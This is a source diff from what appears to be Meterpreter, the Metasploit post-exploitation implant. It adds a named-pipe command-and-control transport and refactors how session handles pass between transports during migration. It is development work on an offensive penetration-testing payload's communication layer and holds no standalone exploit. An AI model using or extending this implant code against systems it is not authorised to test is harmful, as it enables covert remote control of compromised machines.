@@ -7,9 +7,8 @@
 
 #include "win/server_transport_winhttp.h"
 #include "win/server_transport_tcp.h"
+#include "win/server_transport_named_pipe.h"
 #include "ssl_lib_setup.h"
-
-#define TRANSPORT_ID_OFFSET 22
 
 extern Command* extensionCommands;
 
@@ -114,6 +113,14 @@ static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transp
 			*size = sizeof(MetsrvTransportTcp);
 		}
 		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon);
+	}
+	else if (wcsncmp(transportCommon->url, L"pipe", 4) == 0)
+	{
+		if (size)
+		{
+			*size = sizeof(MetsrvTransportNamedPipe);
+		}
+		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon);
 	}
 	else
 	{
@@ -243,9 +250,21 @@ static void config_create(Remote* remote, MetsrvConfig** config, LPDWORD size)
 	do
 	{
 		// extend memory appropriately
-		DWORD neededSize = t->type == METERPRETER_TRANSPORT_SSL ? sizeof(MetsrvTransportTcp) : sizeof(MetsrvTransportHttp);
+		DWORD neededSize = 0;
+		switch (t->type)
+		{
+		case METERPRETER_TRANSPORT_SSL:
+			neededSize = sizeof(MetsrvTransportTcp);
+			break;
+		case METERPRETER_TRANSPORT_PIPE:
+			neededSize = sizeof(MetsrvTransportNamedPipe);
+			break;
+		default:
+			neededSize = sizeof(MetsrvTransportHttp);
+			break;
+		}
 
-		dprintf("[CONFIG] Allocating %u bytes for %s transport, total of %u bytes", neededSize, t->type == METERPRETER_TRANSPORT_SSL ? "ssl" : "http/s", s);
+		dprintf("[CONFIG] Allocating %u bytes for transport, total of %u bytes", neededSize, s);
 
 		sess = (MetsrvSession*)realloc(sess, s + neededSize);
 
@@ -255,23 +274,32 @@ static void config_create(Remote* remote, MetsrvConfig** config, LPDWORD size)
 		ZeroMemory(target, neededSize);
 		s += neededSize;
 
-		if (t->type == METERPRETER_TRANSPORT_SSL)
+		switch (t->type)
 		{
-			transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
-			dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
-			dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
-			dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
-			dprintf("[CONFIG] TCP URL: %S", ((MetsrvTransportTcp*)target)->common.url);
-
-			// if the current transport is TCP, copy the socket fd over so that migration can use it.
-			if (t == current)
+			case METERPRETER_TRANSPORT_SSL:
 			{
-				sess->comms_fd = (DWORD)t->get_socket(t);
+				transport_write_tcp_config(t, (MetsrvTransportTcp*)target);
+				dprintf("[CONFIG] TCP Comms Timeout: %d", ((MetsrvTransportTcp*)target)->common.comms_timeout);
+				dprintf("[CONFIG] TCP Retry Total: %d", ((MetsrvTransportTcp*)target)->common.retry_total);
+				dprintf("[CONFIG] TCP Retry Wait: %d", ((MetsrvTransportTcp*)target)->common.retry_wait);
+				dprintf("[CONFIG] TCP URL: %S", ((MetsrvTransportTcp*)target)->common.url);
+				break;
+			}
+			case METERPRETER_TRANSPORT_PIPE:
+			{
+				transport_write_named_pipe_config(t, (MetsrvTransportNamedPipe*)target);
+				break;
+			}
+			default:
+			{
+				transport_write_http_config(t, (MetsrvTransportHttp*)target);
+				break;
 			}
 		}
-		else
+
+		if (t == current && t->get_handle)
 		{
-			transport_write_http_config(t, (MetsrvTransportHttp*)target);
+			sess->comms_handle = t->get_handle(t);
 		}
 
 		t = t->next_transport;
@@ -304,7 +332,7 @@ DWORD server_setup(MetsrvConfig* config)
 	DWORD res = 0;
 
 	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
-	dprintf("[SESSION] Comms Fd: %u", config->session.comms_fd);
+	dprintf("[SESSION] Comms Fd: %u", config->session.comms_handle);
 	dprintf("[SESSION] Expiry: %u", config->session.expiry);
 
 	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
@@ -354,11 +382,17 @@ DWORD server_setup(MetsrvConfig* config)
 				break;
 			}
 
-			// the first transport should match the transport that we initially connected on.
-			// If it's TCP comms, we need to wire that up.
-			if (remote->transport->type == METERPRETER_TRANSPORT_SSL && config->session.comms_fd)
+			// pass stuff through based on session type. this should go elsewhere I'd say.
+			if (config->session.comms_handle)
 			{
-				((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_fd;
+				if (remote->transport->type == METERPRETER_TRANSPORT_SSL)
+				{
+					((TcpTransportContext*)remote->transport->ctx)->fd = (SOCKET)config->session.comms_handle;
+				}
+				else if (remote->transport->type == METERPRETER_TRANSPORT_PIPE)
+				{
+					((NamedPipeTransportContext*)remote->transport->ctx)->pipe = (HANDLE)config->session.comms_handle;
+				}
 			}
 
 			// Set up the transport creation function pointer
